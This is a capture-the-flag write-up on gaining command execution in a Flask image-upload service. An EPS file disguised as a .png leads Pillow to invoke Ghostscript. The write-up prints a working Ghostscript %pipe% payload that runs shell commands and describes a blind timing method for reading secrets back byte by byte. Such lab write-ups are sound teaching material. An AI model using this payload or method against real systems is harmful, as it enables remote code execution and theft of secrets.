# 2017 Pill my Python

## Flag

`GoH{Thls_one_w45_InTER3ST1N6_Huh?}`

## Summary

The app is a Flask upload endpoint running on Python 3.5.3 / Werkzeug 1.0.1. It appears to accept `.png` uploads, but the backend trusts the real file content instead of enforcing actual PNG parsing only.

That means an EPS / PostScript file can be uploaded with a `.png` filename. Pillow detects the EPS content and hands it off to Ghostscript. Because this is a 2017-style Ghostscript setup, the classic `%pipe%` / `putdeviceprops` trick gives blind command execution.

`/flag.txt` is only a hint. It points you toward the environment. The real flag is stored in the `GZCTF_FLAG` environment variable.

## Exploit Path

1. Visit the root page and confirm it is a file upload form.
2. Upload a tiny EPS file but name it `something.png`.
3. Confirm EPS is parsed by checking that the server returns image dimensions.
4. Use a Ghostscript payload to execute shell commands with `%pipe%`.
5. Dump `printenv GZCTF_FLAG` to a temporary file on the target, for example `/tmp/realflag.txt`.
6. Read `/tmp/realflag.txt` back through a blind timing oracle by testing one byte at a time.
7. Recover the flag until the closing `}`.

## Why It Works

- Extension check is weak: only the filename suffix matters.
- Pillow identifies EPS by file content, not by the filename extension.
- Ghostscript is invoked for EPS parsing.
- Ghostscript can be abused for command execution in this old configuration.
- The challenge infrastructure injects the real flag through `GZCTF_FLAG`.

## Example EPS Payload

This payload writes the flag value into `/tmp/realflag.txt` on the target:

```postscript
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: 0 0 100 100
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%sh -c 'printenv GZCTF_FLAG > /tmp/realflag.txt') currentdevice putdeviceprops
```

Upload that file as `anything.png`.

## Blind Read Strategy

Once `/tmp/realflag.txt` exists, recover it one byte at a time:

- For byte `i`, run `dd if=/tmp/realflag.txt bs=1 skip=i count=1`.
- Convert it to a decimal byte with `od -An -tu1`.
- Compare the result to a threshold.
- If the condition is true, sleep for several seconds.
- Detect the delay from your HTTP client.
- Binary-search each byte until you reconstruct the string.

## Notes

- `GZCTF_FLAG` may differ per instance, so always extract it from the current target.
- `/flag.txt` is not the actual flag here; it only hints that the secret is in the environment.
